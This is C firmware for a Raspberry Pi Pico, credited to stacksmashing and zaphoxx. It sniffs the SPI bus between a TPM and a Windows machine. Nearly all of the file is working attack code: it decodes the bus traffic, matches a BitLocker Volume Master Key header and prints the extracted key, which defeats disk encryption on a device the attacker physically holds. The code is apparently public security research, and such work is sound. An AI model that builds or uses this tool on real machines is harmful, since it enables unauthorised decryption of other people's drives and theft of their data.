#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include "pico/stdlib.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"
#include "pico/multicore.h"

// Our assembled program:
#include "spi_sniffer.pio.h"
#include "hardware/flash.h"

#define JMP_PIN 5
#define BASE_PIN 2

unsigned char reverse(unsigned char b) {
   b = (b & 0xF0) >> 4 | (b & 0x0F) << 4;
   b = (b & 0xCC) >> 2 | (b & 0x33) << 2;
   b = (b & 0xAA) >> 1 | (b & 0x55) << 1;
   return b;
}

static inline char reverse_nibbles(char c) {
    return ((c<<4) & 0xF0) | ((c >> 4) & 0xFF);
}

static inline uint32_t fix_bit_format(uint32_t input) {
    char a1 = (input >> 24) & 0xFF;
    char a2 = (input >> 16) & 0xFF;
    char a3 = (input >> 8) & 0xFF;
    char a4 = input & 0xFF;
    return (a1 << 24) | (a2 << 16) | (a3 << 8) | a4;
}

enum state {
    STATE_IDLE,
    STATE_READING
};

static inline uint32_t fetch(PIO pio, uint sm) {
    uint32_t result_raw = pio_sm_get_blocking(pio, sm);
    uint32_t result = fix_bit_format(result_raw); // i dont know why this is actually needed
    return result;
}


static inline uint8_t fetch_message(PIO pio, uint sm) {
    uint64_t mosi_msg=0x0;
    uint64_t miso_msg=0x0;
    uint32_t data;
    bool init = true;
    //printf("[fetch_message] \n");
    while(1)
    {
        char miso_byte = 0x0;
        char mosi_byte = 0x0;
        uint16_t mosi_msk = 0b0100000000000000;
        uint16_t miso_msk = 0b1000000000000000; 
        data = fetch(pio, sm);//( pio_sm_get_blocking(pio, sm) );
        // untangle DO and DI parts
        for (int i = 0; i < 8 ; i++)
        {   
            miso_byte = miso_byte | ((char) ((data & miso_msk) >> (8-i))) ;
            mosi_byte = mosi_byte | ((char) ((data & mosi_msk) >> (7-i))) ;
            miso_msk = miso_msk >> 2;
            mosi_msk = mosi_msk >> 2;
        }
        if (init) {
            mosi_msg = mosi_msg | mosi_byte;
            miso_msg = miso_msg | miso_byte;    
        }else{
            mosi_msg = (mosi_msg << 8) | mosi_byte;
            miso_msg = (miso_msg << 8) | miso_byte;
        }
        init = false;
        if (!((mosi_msg & 0x00000000ff00ff00) == 0x00D4002400)) continue;
        char message = (char) (miso_msg & 0xff);
        return message;
    }
}

static const char vmk_header[] = {//0x2c, 0x00, 0x00, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
    0x2c, 0x00, 0x05, 0x0, 0x01, 0x00, 0x00, 0x00, 0x03, 0x20, 0x00, 0x00
};

#define MAXCOUNT 512
uint32_t buf[MAXCOUNT];


char message_buffer[4096*2];
volatile size_t msg_buffer_ptr = 0;
bool byte_found = false;

void core1_entry() {
    PIO pio = pio0;
    uint offset = pio_add_program(pio, &spi_sniffer_program);
    uint sm = pio_claim_unused_sm(pio, true);
    spi_sniffer_program_init(pio, sm, offset, BASE_PIN, JMP_PIN);
    
    while(1) {
        char message = fetch_message(pio, sm);
        if (!(message == 0x2c)) continue;
	    //printf("[VMK header ...]\n");
        message_buffer[msg_buffer_ptr++] = message;
        multicore_fifo_push_blocking(msg_buffer_ptr);
        for (int i = 0 ; i < 44; i++) {
            message_buffer[msg_buffer_ptr++] = fetch_message(pio, sm);
        }
    }
}


int main() {
    set_sys_clock_khz(270000, true); // 158us
    stdio_init_all();
    sleep_ms(5000);

    puts(" _           ");
    puts("|_) o  _  _  ");
    puts("|   | (_ (_) ");
    puts("");
    
    puts("88P'888'Y88 888 88e    e   e        dP\"8         ,e,  dP,e,  dP,e,                ");
    puts("P'  888  'Y 888 888D  d8b d8b      C8b Y 888 8e   \"   8b \"   8b \"   ,e e,  888,8, ");
    puts("    888     888 88\"  e Y8b Y8b      Y8b  888 88b 888 888888 888888 d88 88b 888 \"  ");
    puts("    888     888     d8b Y8b Y8b    b Y8D 888 888 888  888    888   888   , 888    ");
    puts("    888     888    d888b Y8b Y8b   8edP  888 888 888  888    888    \"YeeP\" 888    ");
    puts("                                                                 - by stacksmashing");
    puts("                                                                 - spi-tpmsniff by zaphoxx");
    puts("");
    
    printf("[+] Ready to sniff!\n");
    float f = (float) clock_get_hz(clk_sys);
    printf("[+] %f \n",f);
    
    multicore_launch_core1(core1_entry);

    while(1) {
        uint32_t popped = multicore_fifo_pop_blocking();
	    //printf("[%d, %d]\n",popped,byte_found);
        // Wait til the msg_buffer_ptr is full
        while((msg_buffer_ptr - popped) < 44) {
        }
        if(memcmp(message_buffer + popped, vmk_header, 12) == 0) {
            printf("[+] Bitlocker Volume Master Key found:\n");
	    printf("[+] VMK Header: ");
	    for (int i = 0; i < 12; i++)
	    {
	        printf("%02X ", message_buffer[popped + i]);
	    }
	    
	    puts("");
            for(int i=0; i < 2; i++) {
                printf("[+] ");
                for(int j=0; j < 2; j++) {
                    for(int k=0; k < 8; k++) {
                        printf("%02x ", message_buffer[popped + 12 + (i * 16) + (j * 8) + k]);
                    }
                    printf(" ");
                }
                puts("");
            }
        }
    }
}
